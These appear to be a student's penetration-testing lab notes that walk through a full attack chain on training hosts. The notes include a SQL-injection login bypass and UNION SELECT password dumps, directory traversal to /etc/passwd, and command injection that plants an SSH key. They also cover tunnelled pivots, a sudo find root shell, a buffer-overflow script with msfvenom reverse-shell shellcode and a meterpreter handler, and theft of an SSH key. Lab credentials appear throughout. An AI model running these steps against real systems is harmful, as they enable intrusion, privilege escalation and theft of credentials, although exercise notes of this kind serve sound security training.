# OPNOTES
## Login Page
From the login page we can attempt the truth statement
1. Truth statement
2. Network --> grab Post --> copy into URL/?<paste>
3. should receive list of credentials

4. user

## Http-enum
1. Run http enum on the webserver to pull back information about sites
```
nmap -T4 -Pn --script http-enum 10.50.36.82

Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-28 13:05 UTC
Nmap scan report for 10.50.36.82
Host is up (0.0012s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
```

2. The scripts.py had credentials to ssh into the 10.50.36.82
3. user2:EaglesIsARE78


## development.py
```
#!/usr/bin/python3

import os

system_user=user2
user_password=EaglesIsARE78



##Developer note

#script will eventually take above system user credentials and run automated services

```
We are going to change this to give us a root shell


## URL myfile=
1. From the search for file bar we can go to
2. /etc/passwd by
```
http://127.0.0.1:2500/getcareers.php?myfile=../../../../../../etc/passwd
```
3. as well as /etc/hosts
```
 127.0.0.1 localhost
# The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters ff02::3
ip6-allhosts 192.168.28.181 WebApp
```

## 127.0.0.1:2501 (TG2)
From using the /etc/hosts we are able to find another IP address and from there we create a -MS socket to go to the 192.168.28.181 http port
```
ssh -MS /tmp/T1 user2@10.50.36.82
ssh -S /tmp/T1 some -O forward -L 2501:192.168.28.181:80
```

## URL UNION SELECTION
1. Upon reaching 192.168.28.181 we come to a selection screen
2. We test each of the product=1(2,3,4,5,6,7)
3. And found product 7 to be the vulnerable UNION SELECT
http://127.0.0.1:2501/pick.php product=7%20UNION%20SELECT%20table_schema,column_name,table_name%20FROM%20information_schema.columns
4. Using golden Rule
```
http://127.0.0.1:2501/pick.php?product=7  UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
```
5. from here we enumerate
6. http://127.0.0.1:2501/pick.php?product=7 UNION SELECT username,name,user_id FROM siteusers.users
```
HAM 	32 	$15
Aaron 	Aaron 	$Aaron
user2 	user2 	$user2
user3 	user3 	$user3
Lroth 	Lee_Roth 	$Lee_Roth
ncnffjbeqlCn$$jbeq 	Aaron 	$Aaron
RntyrfVfNER78 	user2 	$user2
Obo4GURRnccyrf 	user3 	$user3
anotherpassword4THEages 	Lroth 	$Lroth

UNZ 	32 	$15
1 	Nneba 	$Nneba
2 	hfre2 	$hfre2
3 	hfre3 	$hfre3
4 	Yebgu 	$Yrr_Ebgu
1 	apasswordyPa$$word 	$Nneba
2 	EaglesIsARE78 	$hfre2
3 	Bob4THEEapples 	$hfre3
4 	nabgurecnffjbeq4GURntrf 	$Yebgu
```

## Ping for other Devices
```
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```
1. From this command you find the other devices

user2@PublicFacingWebsite:/var/www/html$ for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=0.943 ms
64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=7.69 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.071 ms


## .172
1. nmap to find ports
2. nmap -Pn -T4 192.168.28.172
We have 22
3. ssh -S /tmp/T1 -O forward -L 2506:192.168.28.172:22
4. login using cred found on .181
5. enter "bash" for a bash shell and perform a ping sweep and sudo -l to escalate privs
6. we found a 179
```
Aaron@RoundSensor:/$ for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
64 bytes from 192.168.28.172: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=1.58 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.315 ms
64 bytes from 192.168.28.214: icmp_seq=1 ttl=64 time=4.34 ms
```
7. Open -D 9050 and nmap for open ports
8. sudo -l
```
(ALL) NOPASSWD: /usr/bin/find
GTFO bins and find
> sudo find . -exec /bin/sh \; -quit
# {root shell accepted}
```


## .179
1. nmap proxychains to find ports open from the .172
proxychains nmap -Pn -T4 192.168.28.179
```
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
9999/tcp open  abyss
```

2. Create MS to .172 and create -S to .179
3. ssh -MS /tmp/T4 Aaron@127.0.0.1 -p 2506
4. ssh -S /tmp/T4 dumb -O forward -L 2510:192.168.28.179:3389
5. Now we can RDP
```
xfreerdp /u:Lroth /v:127.0.0.1:2510 -dynamic-resolution +glyph-cache +clipboard
rm -rf /home/student/.config/freerdp/known_hosts
```

6. Now we need to generate shell code using msfconsole and make a .py 

OVERFLOW.PY goes through 127.0.0.1:{RHP1} to port 9999 on Vuln HOST
Using -S -O forward -L {RHP1}:VulnHost:9999
MSFCONSOLE listens on another completely random {RHP2} that your payload must reach back to via FLOAT IP and {RHP2}


STEP ONE

CREATE.PY and create a forward to go from s.connect port to port 9999 on .179

```
overflow.py
#!/usr/bin/env python
import socket

buf = "TRUN /.:/"
buf += ""

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 49999))

print s.recv(1024)
s.send(buf)
print s.recv(1024)

s.close()
```

ssh -S -O forward -L 49999:<Vuln HOST>:9999

STEP TWO

MSFCONSOLE PAYLAOD
```
use multi/handler
set LPORT 54321
set LHOST 0.0.0.0
set payload windows/meterpreter/reverse_tcp
exploit
```

STEP 3

Generate SHELL CODE
```
msfvenom -p windows/shell/reverse_tcp lhost=10.50.37.42 lport=54321 -b "\x00" -f python
lhost is LINOPS FLOAT IP
LPORT is RHP used in MSFCONSOLE
```





# Dry Run Review

## (1) Host Enumeration (TGT1)
First NMAP the given IP Address to get information about the ports open
```
student@lin-ops:~$ nmap -Pn -T4 10.50.36.82

Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-28 17:46 UTC
Nmap scan report for 10.50.36.82
Host is up (0.0023s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.93 seconds
```



## (2) Port Enumeration (TGT1)
Perform a http-enum script to see what the port 80 has
```
student@lin-ops:~$ nmap --script http-enum 10.50.36.82

Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-28 17:48 UTC
Nmap scan report for 10.50.36.82
Host is up (0.0044s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 5.30 seconds
```

## (3) Website Enumeration (TGT1)
Firefox to the IP Address hosting port 80 and enumerate
http://10.50.36.82

Open all the tabs to see what each site can be used for information


## (4) Authentication Bypass Login.html (TGT1)
```
login.html

Perform truth statement in both fields 

username: ' or 1 = '1
password: ' or 1 = '1

If we get information we Inspect and go to Network --> Post --> Copy to URL/?<paste>
http://10.50.36.82/login.php/?<PASTE NETWORK POST RAW INFORMATION>
```

## (5) Search File to Read (TGT1)
```
test ; whoami to see if it would get information

perform a directory traversel
../../../../../etc/passwd

Copy the USERS with shells and get the users with credentials we found from Authentication Bypass


Get Careers Page: ---> Directory Traversal
../../../../etc/passwd
user2:.....

../../../../../etc/host
for information about hosts for next pivot

```

## (6) Malicious Upload (TGT1)
```
Need to know:
Way to Upload
Where it Uploads
Way to run it

Upload Pages
upload.php

How to:


```

## (7) /scripts (TGT1)
```
http-enum provided sub directories and within /scripts we located information about a user

```


## (8) Authenticate TGT1 and Enum next PIVOT (TGT1)
```
ssh user2@10.50.36.28

> bash
> unset histfile
> for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done (ping sweep command to locate other boxes)

user2@PublicFacingWebsite:/$ for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=1.23 ms
64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=8.98 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.068 ms

ssh -MS /tmp/T1 user2@10.50.36.28
ssh -S /tmp/T1 T1 -O forward -D 9050 (Dynamic SOCKET)

> proxychains nmap 192.168.28.181
> proxychains nc 192.168.28.181 <PORT> (This will enumerate each port to verify the service)
> proxychains nmap --script http-enum 192.168.28.181



```


## (9) Tunnel and ENUM TGT2 80 - SQL INJECTION (TGT2)
```
ssh -S /tmp/T1 T1 -O forward -L 1234:192.168.28.181:80
firefox
http://127.0.0.1:1234


Perform DATABASE enumeration

http://127.0.0.1:1234/pick.php?product=7 OR 1 = '1'
http://127.0.0.1:1234/pick.php?product=7 UNION SELECT 1,2,3(4,5,6,7) (Can see ORDER from here) (The current order is 1,3,2)
http://127.0.0.1:1234/pick.php?product=7 UNION 

GOLDEN STATEMENT
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns

Since the order is 1,3,2 we can reorder it to show properly

http://127.0.0.1:1234/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns

--> Scroll to bottom and see USER Configured Databases
--> Dump all the Column for each information

http://127.0.0.1:1234/pick.php?product=7 UNION SELECT username,name,user_id FROM siteusers.users


HAM 	                    32  $15
Aaron 	                  1 	 $Aaron
user2 	                  2 	 $user2
user3 	                  3 	 $user3
Lroth 	                  4 	 $Lee_Roth
ncnffjbeqlCn$$jbeq 	     1 	 $Aaron
RntyrfVfNER78 	          2 	 $user2
Obo4GURRnccyrf 	         3 	 $user3
anotherpassword4THEages 	4 	 $Lroth

--> Be sure to mess with filter to get all the DATA
--> ROT 13 the passwords that were found
-->


apasswordyPa$$word 	   
EaglesIsARE78 	         
Bob4THEEapples 	        
nabgurecnffjbeq4GURntrf
```


## (10) SUDO -L (TGT3)
```
Using the creds on the next box we are able to access 192.168.28.172 using Credentials found in 9

SUDO -L

linops:> ssh Aaron@192.168.28.172
Aaron@RoundSensor:/> sudo -l (Finds what you can sudo)

(ALL) NOPASSWD: /usr/bin/find
GTFO bins and find
> sudo find . -exec /bin/sh \; -quit
# {root shell accepted}

With finding the SUDO -L information we can go to GTFO BINS and find a SUDO

Now we have Root Access due to the SUDO priv escalation found on GTFO

```

## (11) Now that we have ROOT on .172 (TGT3)
```
Enumerate information

cat /etc/passwd
cat /etc/hosts
ip a
ip n
After we perform the ip n we can find more boxes to enumerate past the TGT3

Perform a Ping to see what IP Addresses can be reached (TTL can give information about Operating System)
We now found the TGT 4
```

## (12) Enum TGT 4 (TGT3)
```
close and reopen -D 9050 on the TGT2 ssh -s socket

ssh -S /tmp/T2 t2 -O forward -D 9050

proxychains nmap -Pn -T4 192.168.28.179
22 SSh 
135 msrpc
139 netbios-ssn
445 microsoft-ds
3389 ms-wbt-server
9999 abyss

We can try to exploit either 3389 or 9999

```

## (13) 9999 Exploit
```
Now we need to generate shell code using msfconsole and make a .py 

OVERFLOW.PY goes through 127.0.0.1:{RHP1} to port 9999 on Vuln HOST
Using -S -O forward -L {RHP1}:VulnHost:9999
MSFCONSOLE listens on another completely random {RHP2} that your payload must reach back to via FLOAT IP and {RHP2}


STEP ONE

CREATE.PY and create a forward to go from s.connect port to port 9999 on .179

```
overflow.py
#!/usr/bin/env python
import socket

buf = "TRUN /.:/"
buf += ""

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 49999))

print s.recv(1024)
s.send(buf)
print s.recv(1024)

s.close()
```

ssh -S -O forward -L 49999:<Vuln HOST>:9999

STEP TWO

MSFCONSOLE PAYLAOD
```
use multi/handler
set LPORT 54321
set LHOST 0.0.0.0
set payload windows/meterpreter/reverse_tcp
exploit
```

STEP 3

Generate SHELL CODE
```
msfvenom -p windows/shell/reverse_tcp lhost=10.50.37.42 lport=54321 -b "\x00" -f python
lhost is LINOPS FLOAT IP
LPORT is RHP used in MSFCONSOLE
```

```


# Review EXTRANET, INTRANET, INTERNAL

## EXTRANET SSH KEY INJECTION and PIVOT to NEXT
1. locate a way to ls and cat /etc/passwd to find whoami and your home directory
2. from here we can do our key regen command, cat to verify the command worked, and then copy it
```
ssh-keygen -t rsa -b 4096

cat /home/student/.ssh/id_rsa.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBRD3hLc4BF2uohXmOf7rVCRTCkP7y/yw4ndP8qwtsdFpcnmYChMMqTIRrFvtCdYoKA3axczyqYtivmvR5lAqNVkSeUi4pFHR4+w78iy4QwZ81IwVk5so+dgWggiHcvif5Z8DsAOmi818gYi60zm3+7dVSUeFWwna56kFDGrfH3r3+Dn4WiJwbh61NF6XWQtr/uujhyF1VI1fOQI5uDyGhoXiDqzAawaxb78glt9S9fX9jtQeDg0R9wj7fcFSsWSzkfURaY7LCvGeK/mt/ZNt1AIDNSmBpj+Kol6+ykKD4ZyyXf9pqoBRwGrcZX9FCBme04PpFnFYUflR/ZPPPFt8VlXjmC6xe9M11XIWwxihQy8TEe1Ua9Tm7wkYL9Rtxwqdt6V05V8GmOHrjftHJtOuZstMqLP3fr/si66viXT4rUDKFDV0hoNlOS7COgJ4K/pu7jwmOVDF2cVoOxUIy4uJApMeVKUwR68iW4WPC3oIGGuxXh9xRhGv/11rhXDhODiIsXRchPig/fBGGdr/qrKIjhoj/ng5oder1k8waqJaBj2Ac0wneiBSHLfgVFJ/R6WxAmKkQuek1KopHcCkaOd2/i57NmIa0lemrleP0AEHuZYDX113WzuB6N7C3qw1jZCT5S67j/n0FzT6rvwi7t/TI+eddfy6BolSCp+Mb2Dd9Lw== student@lin-ops

```
3. Once we have the ssh key we can now create a fake .ssh folder on trget where we will upload our key
```
cd /var/www      (GO TO USER HOME DIR)
mkdir /var/www/.ssh              (CREATE A .ssh FOLDER)
; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBRD3hLc4BF2uohXmOf7rVCRTCkP7y/yw4ndP8qwtsdFpcnmYChMMqTIRrFvtCdYoKA3axczyqYtivmvR5lAqNVkSeUi4pFHR4+w78iy4QwZ81IwVk5so+dgWggiHcvif5Z8DsAOmi818gYi60zm3+7dVSUeFWwna56kFDGrfH3r3+Dn4WiJwbh61NF6XWQtr/uujhyF1VI1fOQI5uDyGhoXiDqzAawaxb78glt9S9fX9jtQeDg0R9wj7fcFSsWSzkfURaY7LCvGeK/mt/ZNt1AIDNSmBpj+Kol6+ykKD4ZyyXf9pqoBRwGrcZX9FCBme04PpFnFYUflR/ZPPPFt8VlXjmC6xe9M11XIWwxihQy8TEe1Ua9Tm7wkYL9Rtxwqdt6V05V8GmOHrjftHJtOuZstMqLP3fr/si66viXT4rUDKFDV0hoNlOS7COgJ4K/pu7jwmOVDF2cVoOxUIy4uJApMeVKUwR68iW4WPC3oIGGuxXh9xRhGv/11rhXDhODiIsXRchPig/fBGGdr/qrKIjhoj/ng5oder1k8waqJaBj2Ac0wneiBSHLfgVFJ/R6WxAmKkQuek1KopHcCkaOd2/i57NmIa0lemrleP0AEHuZYDX113WzuB6N7C3qw1jZCT5S67j/n0FzT6rvwi7t/TI+eddfy6BolSCp+Mb2Dd9Lw== student@lin-ops" >> /var/www/.ssh/authorized_keys

^ THIS COMMAND COPIES OUT KEY WE GENERATED INTO AUTHORIZED KEYS


NOW WE CAN AUTHENTICATE TO THIS BOX VIA PORT 2222 using the USER we added the SSH key to

ssh www-data@127.0.0.1 -p 10005
```

## PIVOT to NEXT HOP and ENUM
1. Once we have our keygen uploaded we can create a MS to that machine and enumerate the other hosts
```
cat /etc/hosts
ip a
ip n
cat /etc/crontab

```
2. We found 192.138.150.253 so we enum with nmap and set up our Sockets to the services being hosts

3. nmap -p 1-50000
4. To verify ports we can proxychains nc <target> port


## STEAL KEY
From doing cat /etc/crontab we see a file 
#
*  *    * * *   root    tar -C /home/comrade/ -czf /tmp/backup.tar.gz .ssh/


WE copy this to our LINOPS
student@lin-ops:~$ scp -P 10005 www-data@127.0.0.1:/tmp/backup.tar.gz .
backup.tar.gz    

Now we create a mkdir stolenkey (DIRECTORY) and unzip this copied file over (tar -xvzf backup.tar.gz -C stolenkey)

Now we stole the key tunnel to the 192.168.150.253 SSH port using the following command to authenticate
ssh -S /tmp/TG2 dynamic -O forward -L 10007:192.168.150.253:3201
 ssh -i /home/student/stolenkey/.ssh/id_rsa comrade@127.0.0.1 -p 10007


## Donovian INTRANET 192.168.150.253 3201 ENUM 
1. comrade@lin:~$ cat password.txt 
comrade::StudentMidwayPassword



















